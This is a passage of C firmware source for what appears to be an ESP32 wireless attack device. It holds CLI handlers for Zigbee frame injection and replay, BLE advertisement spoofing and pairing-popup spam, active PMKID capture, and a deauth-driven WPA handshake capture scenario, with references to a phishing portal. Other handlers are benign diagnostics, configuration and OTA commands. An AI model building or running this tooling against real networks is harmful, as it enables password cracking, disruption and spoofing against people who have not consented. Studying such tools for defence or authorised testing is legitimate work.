        printf("META,ZB,TX,DRY,len,%d,data,", n);
        for (int i = 0; i < n; i++) printf("%02x", frame[i]);
        printf("\n");
        fflush(stdout);
        return 0;
    }

    if (!yes && !confirm_dangerous(argc, argv, "<args>")) return 1;

    wifi_attack_stop_all();
    if (!zbtx_is_on()) {
        int ch = 11;
        if (argc >= 3 && strcmp(sub, "raw") != 0 && strcmp(sub, "replay") != 0) {
            ch = atoi(argv[2]);
        } else if (strcmp(sub, "replay") == 0) {
            int8_t rssi; uint8_t lqi, c2; uint64_t ts;
            uint8_t tmp[ZB_FRAME_MAX + 1];
            if (zbsniff_get(atoi(argv[2]), tmp, sizeof(tmp), &rssi, &lqi, &c2, &ts) > 0) ch = c2;
        }
        esp_err_t e = zbtx_start((uint8_t)ch);
        if (e != ESP_OK) {
            printf("META,ZB,TX,ERR,code,%d,msg,tx_start_failed\n", (int)e);
            fflush(stdout); return 1;
        }
        printf("META,ZB,TX,START,ch,%d\n", ch);
        fflush(stdout);
    }

    /* beaconreq: 发完留在信道上听回应 (协调器收到会回 beacon) */
    bool discover = (strcmp(sub, "beaconreq") == 0);
    int dwell_ms = 2000;
    if (discover && argc >= 4) {
        int v = atoi(argv[3]);
        if (v >= 200 && v <= 20000) dwell_ms = v;
    }
    bool started_sniff = false;
    if (discover) {
        if (!zbsniff_is_on()) {
            esp_err_t e = zbsniff_start(zbtx_channel());
            if (e == ESP_OK) started_sniff = true;
        }
        zbsniff_clear();
    }

    int ok = 0, bad = 0, cca_busy = 0;
    for (int i = 0; i < rep; i++) {
        esp_err_t e = ESP_FAIL;
        /* CCA busy 就退避重试: 802.15.4 与 Wi-Fi 同频段, 现场 AP 多时
         * 单次尝试大概率抢不到窗口. --noca 跳过 CCA. */
        for (int t = 0; t < (noca ? 1 : 4); t++) {
            e = zbtx_send(frame, n, 500, !noca);
            if (e == ESP_OK) break;
            if (zbtx_last_error() == 1) cca_busy++;   /* TX_ERR_CCA_BUSY */
            vTaskDelay(pdMS_TO_TICKS(12));
        }
        if (e == ESP_OK) ok++;
        else bad++;
    }

    if (discover) {
        /* 轮询抓包表: 只统计 beacon 帧, 汇总不同 PAN */
        int seen = 0;
        uint16_t pans[24]; int pan_n = 0;
        uint32_t t0 = xTaskGetTickCount();
        while ((xTaskGetTickCount() - t0) < pdMS_TO_TICKS(dwell_ms)) {
            vTaskDelay(pdMS_TO_TICKS(100));
            int cnt = zbsniff_count();
            for (; seen < cnt; seen++) {
                uint8_t b[ZB_FRAME_MAX + 1];
                int8_t rssi; uint8_t lqi, ch; uint64_t ts;
                int len = zbsniff_get(seen, b, sizeof(b), &rssi, &lqi, &ch, &ts);
                if (len < 5) continue;
                if ((b[1] & 0x07) != 0) continue;          /* 只看 beacon */
                if ((b[1] & 0xC0) != 0x80) continue;       /* src 须为短地址 */
                uint16_t pan = (uint16_t)(b[3] | (b[4] << 8));
                bool dup = false;
                for (int k = 0; k < pan_n; k++) if (pans[k] == pan) dup = true;
                if (!dup && pan_n < 24) {
                    pans[pan_n++] = pan;
                    printf("META,ZB,PAN,pan,0x%04x,src,0x%04x,rssi,%d,lqi,%u,ch,%u\n",
                           (unsigned)pan, (unsigned)(b[5] | (b[6] << 8)),
                           (int)rssi, (unsigned)lqi, (unsigned)ch);
                }
            }
        }
        printf("META,ZB,TX,DONE,sub,beaconreq,tx_ok,%d,tx_bad,%d,pans,%d,dwell_ms,%d\n",
               ok, bad, pan_n, dwell_ms);
        fflush(stdout);
        if (started_sniff) {
            zbsniff_stop();
            printf("META,ZB,TX,NOTE,sniff_stopped (本命令自动开的嗅探已关)\n");
            fflush(stdout);
        }
        return 0;
    }

    printf("META,ZB,TX,DONE,sub,%s,ok,%d,bad,%d,cca_busy,%d,lasterr,%d\n",
           sub, ok, bad, cca_busy, zbtx_last_error());
    fflush(stdout);
    return bad ? 1 : 0;
}

/* gatt: BLE GATT 枚举 (central 角色连第三方设备).
 * MAC 是人类习惯顺序, 内部转成 NimBLE 小端. */
static int cmd_gatt(int argc, char **argv)
{
    if (argc >= 2 && strcmp(argv[1], "stop") == 0) {
        esp_err_t e = gatt_stop();
        if (e != ESP_OK) printf("META,BTGATT,ERR,msg,not_running\n");
        else            printf("META,BTGATT,STOP,ok,1\n");
        fflush(stdout);
        return e == ESP_OK ? 0 : 1;
    }
    if (argc >= 2 && strcmp(argv[1], "status") == 0) { gatt_status(); return 0; }

    if (argc < 2) {
        printf("usage: gatt <mac> [--timeout ms] | stop | status\n");
        fflush(stdout);
        return 1;
    }
    uint8_t human[6];
    if (!parse_mac(argv[1], human)) {
        printf("META,BTGATT,ERR,msg,bad_mac\n"); fflush(stdout); return 1;
    }
    uint32_t timeout = 10000;
    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "--timeout") == 0 && i + 1 < argc) {
            int v = atoi(argv[++i]);
            if (v >= 1000 && v <= 60000) timeout = (uint32_t)v;
        }
    }
    /* parse_mac 给的是人类顺序, NimBLE 的 addr.val 是小端, 要反过来 */
    uint8_t le[6];
    for (int i = 0; i < 6; i++) le[i] = human[5 - i];

    esp_err_t e = gatt_start(le, timeout);
    if (e != ESP_OK) {
        printf("META,BTGATT,ERR,code,%d,msg,start_failed\n", (int)e);
        fflush(stdout); return 1;
    }
    printf("META,BTGATT,START,mac,%02x:%02x:%02x:%02x:%02x:%02x,timeout,%u\n",
           human[0], human[1], human[2], human[3], human[4], human[5],
           (unsigned)timeout);
    fflush(stdout);
    return 0;
}

/* ftm: 802.11mc FTM 测距 */
static int cmd_ftm(int argc, char **argv)
{
    if (argc >= 2 && strcmp(argv[1], "range") == 0) {
        if (argc < 3) {
            printf("usage: ftm range <bssid> [channel] [count 16/24/32/64]\n"); fflush(stdout); return 1;
        }
        uint8_t bssid[6];
        if (!parse_mac(argv[2], bssid)) {
            printf("META,FTM,ERR,msg,bad_bssid\n"); fflush(stdout); return 1;
        }
        int ch = (argc >= 4) ? atoi(argv[3]) : 0;
        if (ch < 0 || ch > 177) ch = 0;
        int cnt = (argc >= 5) ? atoi(argv[4]) : 0;
        uint8_t frm = 0;
        if (cnt == 16 || cnt == 24 || cnt == 32 || cnt == 64) frm = (uint8_t)cnt;

        /* esp_wifi_ftm_initiate_session() 不接受 channel=0, 会直接回
         * ESP_ERR_INVALID_ARG(258)。不填信道时从库里取目标的信道。 */
        if (ch == 0) {
            char fssid[33] = {0};
            uint8_t apch = 0;
            if (find_ap(bssid, fssid, sizeof(fssid), &apch)) ch = apch;
        }
        if (ch == 0) {
            printf("META,FTM,ERR,msg,need_channel (目标不在库里, 请显式给信道)\n");
            fflush(stdout);
            return 1;
        }

        /* FTM 与嗅探/注入共用同一射频: 先停掉 Wi-Fi 作业 */
        wifi_attack_stop_all();
        esp_err_t e = ftm_range(bssid, (uint8_t)ch, frm, 0);
        if (e != ESP_OK) {
            printf("META,FTM,ERR,code,%d\n", (int)e); fflush(stdout); return 1;
        }
        return 0;
    }
    printf("usage: ftm range <bssid> [channel] [count 16/24/32/64]\n");
    fflush(stdout);
    return 1;
}

/* ble: BLE 发射功率控制
 * C5 支持 +20 dBm 高功率模式. 开机默认已拉满 (见 ble_cli_start),
 * 此命令用于查询/临时调整: ble power [<0-15>]   (15 = +20 dBm) */
static int cmd_ble(int argc, char **argv)
{
    if (argc >= 2 && strcmp(argv[1], "power") == 0) {
        if (argc >= 3) {
            int lv = atoi(argv[2]);
            if (lv < 0)  lv = 0;
            if (lv > 15) lv = 15;
            esp_err_t e1 = esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, (esp_power_level_t)lv);
            esp_err_t e2 = esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV,     (esp_power_level_t)lv);
            esp_err_t e3 = esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN,    (esp_power_level_t)lv);
            esp_err_t e  = (e1 != ESP_OK) ? e1 : ((e2 != ESP_OK) ? e2 : e3);
            printf("META,BLE,POWER,set,%d,err,%d\n", lv, (int)e);
            fflush(stdout);
            return e == ESP_OK ? 0 : 1;
        }
        int cur = (int)esp_ble_tx_power_get(ESP_BLE_PWR_TYPE_DEFAULT);
        /* 索引→dBm: 0..14 线性 (level-8)*3, level 15 例外 = +20 (非线性收尾) */
        int dbm = (cur < 0) ? -99 : ((cur == 15) ? 20 : (cur - 8) * 3);
        printf("META,BLE,POWER,level,%d,dbm,%d\n", cur, dbm);
        fflush(stdout);
        return 0;
    }
    printf("usage: ble power [<0-15>]   (level 15 = +20 dBm)\n");
    fflush(stdout);
    return 1;
}

/* bleadv: BLE 广播伪造
 * 单实例挂起/恢复: 停 NUS 广播 -> 发伪造广播 -> 停止/超时后恢复 NUS.
 * 已建立的 GATT 连接不受影响.
 *   bleadv ibeacon  <uuid32hex> <major> <minor> [sec]
 *   bleadv eddystone <url> [sec]
 *   bleadv stop
 *   bleadv status */
static int cmd_bleadv(int argc, char **argv)
{
    if (argc >= 2 && strcmp(argv[1], "stop") == 0) {
        bleadv_stop();
        return 0;
    }
    if (argc >= 2 && strcmp(argv[1], "status") == 0) {
        bleadv_status();
        return 0;
    }
    if (argc >= 2 && strcmp(argv[1], "ibeacon") == 0) {
        if (argc < 5) {
            printf("usage: bleadv ibeacon <uuid32hex> <major> <minor> [sec]\n");
            fflush(stdout);
            return 1;
        }
        uint16_t major = (uint16_t)atoi(argv[3]);
        uint16_t minor = (uint16_t)atoi(argv[4]);
        int sec = (argc >= 6) ? atoi(argv[5]) : 0;
        if (sec < 0) sec = 0;
        bleadv_ibeacon(argv[2], major, minor, sec);
        return 0;
    }
    if (argc >= 2 && strcmp(argv[1], "eddystone") == 0) {
        if (argc < 3) {
            printf("usage: bleadv eddystone <url> [sec]\n");
            fflush(stdout);
            return 1;
        }
        int sec = (argc >= 4) ? atoi(argv[3]) : 0;
        if (sec < 0) sec = 0;
        bleadv_eddystone(argv[2], sec);
        return 0;
    }
    if (argc >= 2 && strcmp(argv[1], "popup") == 0) {
        if (argc < 3) {
            printf("usage: bleadv popup <fastpair [modelid]|swiftpair|continuity> [sec]\n");
            fflush(stdout);
            return 1;
        }
        int sec = 0;
        if (strcmp(argv[2], "fastpair") == 0) {
            /* fastpair [modelid] [sec]: modelid 是 3 字节 hex (0x 前缀或纯 hex).
             * 缺省 0 = 占位, Google 服务端查不到, 不会弹. */
            uint32_t model = 0;
            int arg = 3;
            if (argc > arg && argv[arg][0] != '-' ) {
                model = (uint32_t)strtoul(argv[arg], NULL, 0);
                arg++;
            }
            if (argc > arg) sec = atoi(argv[arg]);
            if (model > 0xFFFFFF) model = 0xFFFFFF;
            bleadv_fastpair(model, sec);
            return 0;
        }
        if (argc > 3) sec = atoi(argv[3]);
        if (sec < 0) sec = 0;
        if (strcmp(argv[2], "swiftpair") == 0) { bleadv_swiftpair(sec); return 0; }
        if (strcmp(argv[2], "continuity") == 0) { bleadv_continuity(sec); return 0; }
        printf("META,BLE,ADV,ERR,msg,bad_popup_type (fastpair|swiftpair|continuity)\n");
        fflush(stdout);
        return 1;
    }
    printf("usage: bleadv <ibeacon|eddystone|popup|stop|status>\n");
    fflush(stdout);
    return 1;
}

/* config (NVS 持久化) */
static void cfg_list_cb(const char *k, const char *v, void *ctx)
{
    int *n = (int *)ctx;
    printf("  %s = %s\n", k, v);
    (*n)++;
}

static int cmd_config(int argc, char **argv)
{
    if (argc < 2) {
        printf("usage:\n"
               "  config set <key> <value>   set config entry\n"
               "  config get <key>           get config entry\n"
               "  config list                list all entries\n"
               "  config reset                erase all entries\n");
        fflush(stdout);
        return 1;
    }
    const char *sub = argv[1];
    if (strcmp(sub, "set") == 0) {
        if (argc < 3) { printf("META,CONFIG,ERR,msg,need_key\n"); fflush(stdout); return 1; }
        /* 合并 argv[2..] 为 value (支持带空格的值) */
        static char valbuf[128];
        valbuf[0] = 0;
        for (int i = 3; i < argc; i++) {
            if (i > 3) strncat(valbuf, " ", sizeof(valbuf) - strlen(valbuf) - 1);
            strncat(valbuf, argv[i], sizeof(valbuf) - strlen(valbuf) - 1);
        }
        if (config_set(argv[2], valbuf) == 0)
            printf("META,CONFIG,SET,key,%s,val,%s,ok,1\n", argv[2], valbuf);
        else
            printf("META,CONFIG,ERR,msg,set_failed,detail,key_too_long_or_table_full\n");
    } else if (strcmp(sub, "get") == 0) {
        if (argc < 3) { printf("META,CONFIG,ERR,msg,need_key\n"); fflush(stdout); return 1; }
        const char *v = config_get(argv[2]);
        printf("META,CONFIG,GET,key,%s,val,%s\n", argv[2], v ? v : "(unset)");
    } else if (strcmp(sub, "list") == 0) {
        int n = 0;
        config_foreach(cfg_list_cb, &n);
        printf("(%d entries)\n", n);
    } else if (strcmp(sub, "reset") == 0) {
        config_reset();
        printf("OK: all config erased\n");
    } else {
        printf("META,CONFIG,ERR,msg,bad_subcmd,detail,%s\n", sub);
        fflush(stdout);
        return 1;
    }
    fflush(stdout);
    return 0;
}

/* log (日志环形缓冲) */
static int cmd_log(int argc, char **argv)
{
    if (argc >= 2 && strcmp(argv[1], "clear") == 0) {
        logring_clear();
        printf("log buffer cleared\n");
        fflush(stdout);
        return 0;
    }
    size_t used = logring_used();
    printf("=== log ring (%u bytes) ===\n", (unsigned)used);
    logring_dump(stdout);
    printf("=== end ===\n");
    fflush(stdout);
    return 0;
}

/* health (整机自检) */

static int cmd_health(int argc, char **argv)
{
    (void)argc; (void)argv;
    /* init 任务自删前存下的栈低水位, 由 main.c 写入 */
    extern uint32_t g_init_stack_min;
    uint32_t int_free = heap_caps_get_free_size(MALLOC_CAP_INTERNAL);
    uint32_t int_largest = heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL);
    uint32_t ps_free = heap_caps_get_free_size(MALLOC_CAP_SPIRAM);
    uint32_t ps_largest = heap_caps_get_largest_free_block(MALLOC_CAP_SPIRAM);
    uint32_t total_free = esp_get_free_heap_size();
    uint32_t min_free = esp_get_minimum_free_heap_size();

    /* 空闲块数与最大块一起看才有意义: 内部堆剩 50KB 但被切成 20 块时,
     * 最大连续块可能只剩 4KB, NimBLE 重新起广播就申请不到.
     * frag = 1 - largest/free, 越高越碎. */
    multi_heap_info_t mi;
    heap_caps_get_info(&mi, MALLOC_CAP_INTERNAL);
    unsigned frag = mi.total_free_bytes
        ? (unsigned)(100 - (uint64_t)mi.largest_free_block * 100 / mi.total_free_bytes)
        : 0;
    /* 本函数跑在 cli_task 里, NULL 取到的就是 cli_task 的栈余量低水位.
     * 栈该给多大要拿这个数定, 不能靠估算. */
    uint32_t cli_stack_min =
        (uint32_t)uxTaskGetStackHighWaterMark(NULL) * sizeof(StackType_t);

    if (g_json) {
        printf("{\"ok\":true,\"heap_total\":%u,\"heap_min\":%u,\"internal_free\":%u,"
               "\"internal_largest\":%u,\"psram_free\":%u,\"psram_largest\":%u,"
               "\"tasks\":%u,\"zbsniff\":%s,\"logring\":%u,\"events\":%u,"
               "\"cap_seg\":%d,\"cap_segs\":%d,"
               "\"internal_blocks\":%u,\"internal_free_blocks\":%u,\"internal_frag\":%u,"
               "\"cli_stack_min\":%u,\"init_stack_min\":%u}\n",
               (unsigned)total_free, (unsigned)min_free, (unsigned)int_free,
               (unsigned)int_largest, (unsigned)ps_free, (unsigned)ps_largest,
               (unsigned)uxTaskGetNumberOfTasks(), zbsniff_is_on() ? "\"run\"" : "\"idle\"",
               (unsigned)logring_used(), event_total(),
               cap_segment_index(), cap_segment_count(),
               (unsigned)mi.total_blocks, (unsigned)mi.free_blocks, frag,
               (unsigned)cli_stack_min, (unsigned)g_init_stack_min);
        fflush(stdout);
        return 0;
    }
    printf("=== HEALTH ===\n");
    printf("heap total_free : %u bytes\n", (unsigned)total_free);
    printf("heap min_free   : %u bytes (low-water)\n", (unsigned)min_free);
    printf("internal free   : %u bytes (largest %u)\n", (unsigned)int_free, (unsigned)int_largest);
    printf("internal blocks : %u total, %u free, frag %u%%\n",
           (unsigned)mi.total_blocks, (unsigned)mi.free_blocks, frag);
    printf("psram    free   : %u bytes (largest %u)\n", (unsigned)ps_free, (unsigned)ps_largest);

    /* 任务数 */
    UBaseType_t tasks = uxTaskGetNumberOfTasks();
    printf("tasks           : %u\n", (unsigned)tasks);
    printf("cli stack left  : %u bytes (low-water)\n", (unsigned)cli_stack_min);
    printf("init stack left : %u bytes (low-water, 任务已退出)\n", (unsigned)g_init_stack_min);

    /* 模块状态 */
    printf("zbsniff         : %s\n", zbsniff_is_on() ? "RUNNING" : "idle");
    printf("logring         : %u bytes buffered\n", (unsigned)logring_used());

    /* 阈值来自实测, 不是估的:
     *   用临时命令逐级占住内部 RAM 再起功能, BLE 扫描 / BLE 广播伪造在
     *   largest 只剩 1344 字节时仍能起来; 最吃内存的 phish start (AP + DHCP +
     *   HTTP + DNS) 在 13312 时正常, 掉到 1664 才失败.
     *   所以 32KB 那条线纯属虚报: 实测 31.7KB 时报 WARN, 但 BLE 与门户都好好的.
     *   取 8KB 作告警线, 是失败点 (1.6KB) 的 5 倍余量. */
    if (int_largest < 8192) {
        printf("WARN: internal largest block %u B < 8KB, 新的 AP/HTTP 会话可能起不来\n",
               (unsigned)int_largest);
    } else {
        printf("OK: internal contiguous %u B\n", (unsigned)int_largest);
    }
    fflush(stdout);
    return 0;
}

/* ota (双区升级)
 * 真正的固件字节从 HTTP POST /api/ota 进来 (App 走 SoftAP 上传),
 * 这里提供状态/确认/回滚/URL 拉取四个管理动作. */
static int cmd_ota(int argc, char **argv)
{
    if (argc < 2) {
        printf("usage:\n"
               "  ota status                 show running/boot slot + image state\n"
               "  ota confirm                mark current image valid (cancel rollback)\n"
               "  ota rollback               roll back to the other slot and reboot\n"
               "  ota url <http(s)://...>    download image from URL (needs network)\n"
               "  ota reboot                 reboot to apply a staged image\n"
               "  ota upload                 (HTTP only) POST /api/ota?token=<api_token>\n");
        return 1;
    }
    const char *sub = argv[1];

    if (strcmp(sub, "status") == 0) { ota_status(); return 0; }
    if (strcmp(sub, "confirm") == 0 || strcmp(sub, "ok") == 0) return ota_confirm();
    if (strcmp(sub, "rollback") == 0) return ota_rollback();
    if (strcmp(sub, "reboot") == 0) {
        printf("META,OTA,REBOOT,1\n");
        fflush(stdout);
        vTaskDelay(pdMS_TO_TICKS(120));
        esp_restart();
        return 0;
    }
    if (strcmp(sub, "url") == 0) {
        if (argc < 3) { printf("META,OTA,ERR,msg,need_url\n"); fflush(stdout); return 1; }
        return ota_url(argv[2]);
    }
    printf("META,OTA,ERR,msg,bad_subcmd (status|confirm|rollback|url|reboot)\n");
    fflush(stdout);
    return 1;
}


/* scenario (一键编排) */
static int cmd_scenario(int argc, char **argv)
{
    if (argc < 2) {
        printf("usage:/n"
               "  scenario survey [secs]            auto-channel survey + summary\n"
               "  scenario handshake <bssid> [secs] sniff/deauth rounds until usable HS\n"
               "  scenario pmf <bssid>              PMF verdict + route advice\n"
               "  scenario stop | status\n");
        return 1;
    }
    const char *sub = argv[1];

    if (strcmp(sub, "survey") == 0) {
        uint32_t secs = (argc >= 3) ? (uint32_t)atoi(argv[2]) : 30;
        return scenario_survey(secs) == ESP_OK ? 0 : 1;
    }
    if (strcmp(sub, "handshake") == 0) {
        if (argc < 3) { printf("META,SCENARIO,ERR,msg,need_bssid\n"); fflush(stdout); return 1; }
        uint8_t b[6];
        if (!parse_mac(argv[2], b)) { printf("META,SCENARIO,ERR,msg,bad_bssid\n"); fflush(stdout); return 1; }
        uint32_t secs = (argc >= 4) ? (uint32_t)atoi(argv[3]) : 40;
        return scenario_handshake(b, secs) == ESP_OK ? 0 : 1;
    }
    if (strcmp(sub, "pmf") == 0) {
        if (argc < 3) { printf("META,SCENARIO,ERR,msg,need_bssid\n"); fflush(stdout); return 1; }
        uint8_t b[6];
        if (!parse_mac(argv[2], b)) { printf("META,SCENARIO,ERR,msg,bad_bssid\n"); fflush(stdout); return 1; }
        return scenario_pmf(b) == ESP_OK ? 0 : 1;
    }
    if (strcmp(sub, "stop") == 0)   { scenario_stop(); return 0; }
    if (strcmp(sub, "status") == 0) { scenario_status(); return 0; }

    printf("META,SCENARIO,ERR,msg,bad_subcmd\n"); fflush(stdout);
    return 1;
}

/* locate (信号定位) */
static int cmd_locate(int argc, char **argv)
{
    if (argc < 2) {
        printf("usage:/n"
               "  locate <bssid|client_mac> [secs]   sample RSSI (2Hz, max 150s)\n"
               "  locate stop | status | export\n");
        return 1;
    }
    if (strcmp(argv[1], "stop") == 0)   { locate_stop(); return 0; }
    if (strcmp(argv[1], "status") == 0) { locate_status(); return 0; }
    if (strcmp(argv[1], "export") == 0) { locate_export_csv(); return 0; }

    uint8_t m[6];
    if (!parse_mac(argv[1], m)) {
        printf("META,LOCATE,ERR,msg,bad_mac\n"); fflush(stdout); return 1;
    }
    uint32_t secs = (argc >= 3) ? (uint32_t)atoi(argv[2]) : 30;
    bool is_client = (wifi_db_find_client(m) != NULL);
    if (!is_client && !wifi_db_find_ap(m)) {
        printf("META,LOCATE,ERR,msg,target_not_in_db (先扫一遍)\n"); fflush(stdout); return 1;
    }
    return locate_start(m, is_client, secs) == ESP_OK ? 0 : 1;
}

/* pmkid
 * 被动: 定点监听, 配合 deauth 逼客户端重连后由 hs 模块提取.
 * 主动: 走驱动自己的 station 关联 (不是 raw 注入的 auth/assoc, 那条路在本硬件上
 *       发不出去, 见 frame_build.c 里 fb_assoc_req_rsn 的注释). 关联一次就能拿到
 *       AP 发来的 M1, PMKID 就在 M1 的 KDE 里, 不需要口令正确. */
static int cmd_pmkid(int argc, char **argv)
{
    if (argc < 2) {
        printf("usage:\n"
               "  pmkid watch <bssid|channel>   start passive PMKID watch\n"
               "  pmkid active <bssid|ssid> [--timeout ms] --yes\n"
               "                                associate once, grab M1/PMKID\n"
               "  pmkid status                  counters (total/complete/pmkid)\n"
               "  pmkid clear\n");
        return 1;
    }
    const char *sub = argv[1];

    if (strcmp(sub, "status") == 0) {
        printf("META,PMKID,STATUS,total,%d,complete,%d,pmkid,%d,mode,passive\n",
               hs_count(), hs_complete_count(), hs_pmkid_count());
        fflush(stdout);
        return 0;
    }
    if (strcmp(sub, "clear") == 0) { hs_clear(); printf("META,PMKID,CLEAR,ok,1\n"); fflush(stdout); return 0; }

    if (strcmp(sub, "watch") == 0) {
        if (argc < 3) { printf("META,PMKID,ERR,msg,need_target\n"); fflush(stdout); return 1; }

        uint8_t b[6], ch = 0;
        if (parse_mac(argv[2], b)) {
            const ap_entry_t *ap = wifi_db_find_ap(b);
            if (!ap) { printf("META,PMKID,ERR,msg,ap_not_in_db\n"); fflush(stdout); return 1; }
            ch = ap->channel;
        } else {
            ch = (uint8_t)atoi(argv[2]);
            if (ch < 1 || (ch > 14 && ch < 36) || ch > 177) {
                printf("META,PMKID,ERR,msg,bad_target\n"); fflush(stdout); return 1;
            }
        }
        esp_err_t e = wifi_attack_sniff_start(ch, 0);
        if (e != ESP_OK) {
            printf("META,PMKID,ERR,msg,sniff_start_failed\n"); fflush(stdout); return 1;
        }
        printf("META,PMKID,WATCH,start,channel,%u,base_total,%d,base_pmkid,%d,mode,passive\n",
               (unsigned)ch, hs_count(), hs_pmkid_count());
        fflush(stdout);
        return 0;
    }
    if (strcmp(sub, "active") == 0) {
        if (!confirm_dangerous(argc, argv, "pmkid active")) return 1;
        if (argc < 3) { printf("META,PMKID,ERR,msg,need_target\n"); fflush(stdout); return 1; }

        uint8_t b[6];
        const ap_entry_t *ap = NULL;
        if (parse_mac(argv[2], b)) {
            ap = wifi_db_find_ap(b);
        } else {
            int n = 0;
            const ap_entry_t *aps = wifi_db_get_aps(&n);
            for (int i = 0; i < n; i++) {
                if (strcmp(aps[i].ssid, argv[2]) == 0) { ap = &aps[i]; break; }
            }
        }
        if (!ap) { printf("META,PMKID,ERR,msg,ap_not_in_db (先扫一遍)\n"); fflush(stdout); return 1; }

        uint32_t timeout = 4000;
        for (int i = 3; i + 1 < argc; i++) {
            if (strcmp(argv[i], "--timeout") == 0) {
                int t = atoi(argv[i + 1]);
                if (t >= 500 && t <= 20000) timeout = (uint32_t)t;
            }
        }

        int m1 = 0, pm = 0;
        int64_t t_start = esp_timer_get_time();
        esp_err_t e = wifi_attack_pmkid_active(ap->bssid, ap->ssid, ap->channel,
                                               timeout, &m1, &pm);
        uint32_t ms = (uint32_t)((esp_timer_get_time() - t_start) / 1000);
        char bstr[18];
        mac_to_str(ap->bssid, bstr);
        if (e != ESP_OK && m1 <= 0) {
            printf("META,PMKID,ACTIVE,ok,0,bssid,%s,ssid,%s,ms,%u,code,%d\n",
                   bstr, ap->ssid, (unsigned)ms, (int)e);
            fflush(stdout);
            return 1;
        }
        printf("META,PMKID,ACTIVE,ok,1,bssid,%s,ssid,%s,ch,%u,m1,%d,pmkid,%d,ms,%u\n",
               bstr, ap->ssid, (unsigned)ap->channel, m1, pm, (unsigned)ms);
        fflush(stdout);
        return pm > 0 ? 0 : 1;
    }
    printf("META,PMKID,ERR,msg,bad_subcmd\n"); fflush(stdout);
    return 1;
}

/* airtime: 逐信道空口占用. 阻塞, 每信道驻留 dwell_ms.
 * 用途是给注入挑一条真正空闲的信道: 只看 AP 数量不够, 一条刷视频的信道
 * 可能只有一台 AP 但占用率 60%. */
static int cmd_airtime(int argc, char **argv)
{
    /* 默认 300ms: beacon 间隔 102.4ms, 驻留只给 100ms 时单个 AP 只有 63%
     * 的概率被看到, 空信道和"有 AP 但没扫到"会混在一起. */
    uint32_t dwell = 300;
    int band = 0, ch = 0;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--dwell") == 0 && i + 1 < argc) {
            dwell = (uint32_t)atoi(argv[++i]);
        } else if (strcmp(argv[i], "--band") == 0 && i + 1 < argc) {
            const char *b = argv[++i];
            band = (strcmp(b, "5g") == 0) ? 1 : (strcmp(b, "all") == 0 ? 2 : 0);
        } else if (strcmp(argv[i], "--ch") == 0 && i + 1 < argc) {
            ch = atoi(argv[++i]);
        } else {
            printf("META,AIRTIME,ERR,msg,bad_option,%s\n", argv[i]);
            fflush(stdout);
            return 1;
        }
    }
    if (ch && !((ch >= 1 && ch <= 14) || (ch >= 36 && ch <= 177))) {
        printf("META,AIRTIME,ERR,msg,bad_channel\n"); fflush(stdout); return 1;
    }
    if (dwell < 50) dwell = 50;
    if (dwell > 5000) dwell = 5000;

    static air_ch_t rows[48];
    int n = wifi_attack_airtime((uint8_t)band, (uint8_t)ch, dwell, rows, 48);
    if (n <= 0) {
        printf("META,AIRTIME,ERR,msg,nothing_measured\n"); fflush(stdout); return 1;
    }

    int best = 0;
    if (dwell < 200) {
        printf("META,AIRTIME,WARN,msg,dwell_short,ms,%u (beacon 102ms, 太短会漏 AP)\n",
               (unsigned)dwell);
    }
    for (int i = 0; i < n; i++) {
        printf("META,AIRTIME,CH,%u,util,%u,frames,%u,air_ms,%u,rssi,%d\n",
               (unsigned)rows[i].ch, (unsigned)rows[i].util,
               (unsigned)rows[i].frames, (unsigned)rows[i].air_ms,
               (int)rows[i].rssi_max);
        if (rows[i].util > rows[best].util) best = i;
    }
    printf("META,AIRTIME,DONE,chans,%d,busiest,%u,util,%u,dwell_ms,%u\n",
           n, (unsigned)rows[best].ch, (unsigned)rows[best].util, (unsigned)dwell);
    fflush(stdout);
    return 0;
}

/* wifi6: BSS Color / TWT / RNR 一览.
 * BSS Color 是空间复用标记: 同色 + 同信道 + 都够强的两个 BSS 会互相把对方
 * 的帧当成"自己人", 空间复用失效. 不同信道本来就不在同一个 OBSS 里, 不算冲突. */
static int cmd_wifi6(int argc, char **argv)
{
    (void)argc; (void)argv;
    int n = 0, he = 0, colors = 0, twt_req = 0, twt_ie = 0, sixg = 0, conflicts = 0;
    const ap_entry_t *aps = wifi_db_get_aps(&n);

    for (int i = 0; i < n; i++) {
        const ap_entry_t *e = &aps[i];
        if (!e->he) continue;
        he++;
        if (e->bss_color) colors++;
        if (e->twt_req) twt_req++;
        if (e->twt) twt_ie++;
        if (e->rnr_6g) sixg++;

        char bs[18];
        mac_to_str(e->bssid, bs);
        printf("META,WIFI6,AP,bssid,%s,ssid,%s,ch,%u,color,%u,twt,%d,twt_req,%d,"
               "rnr,%u,rnr_ch,%u,rnr6g,%d\n",
               bs, e->ssid, (unsigned)e->channel, (unsigned)e->bss_color,
               e->twt ? 1 : 0, e->twt_req ? 1 : 0,
               (unsigned)e->rnr_count, (unsigned)e->rnr_ch, e->rnr_6g ? 1 : 0);
    }

    for (int i = 0; i < n; i++) {
        const ap_entry_t *a = &aps[i];
        if (!a->he || a->bss_color == 0 || a->rssi < -85) continue;

        /* 同一组只由第一个成员报一次 */
        bool first = true;
        for (int j = 0; j < i; j++) {
            const ap_entry_t *b = &aps[j];
            if (b->he && b->bss_color == a->bss_color &&
                b->channel == a->channel && b->rssi >= -85) { first = false; break; }
        }
        if (!first) continue;

        const ap_entry_t *mate = NULL;
        int k = 0;
        for (int j = i + 1; j < n; j++) {
            const ap_entry_t *b = &aps[j];
            if (b->he && b->bss_color == a->bss_color &&
                b->channel == a->channel && b->rssi >= -85) {
                if (!mate) mate = b;
                k++;
            }
        }
        if (k && mate) {
            /* 同一个物理 AP 常发多个 BSSID (主/访客/隐藏), 这些同色是正常的.
             * 判据一: 前 3 字节 OUI 相同且末字节相差 4 以内.
             * 判据二: 一个全局地址配一个本地管理地址, 且 SSID 相同或其中一个是
             * 隐藏的. 多 BSSID 设备常用派生出来的本地 MAC 发隐藏 SSID.
             * 判据二会漏掉"攻击者用本地 MAC 复制同名 SSID"这种情况, 但这条命令
             * 看的是空间复用, 不是找孪生. */
            bool oui_same = memcmp(a->bssid, mate->bssid, 3) == 0;
            bool adj = abs((int)a->bssid[5] - (int)mate->bssid[5]) <= 4;
            bool loc_a = (a->bssid[0] & 0x02) != 0;
            bool loc_b = (mate->bssid[0] & 0x02) != 0;
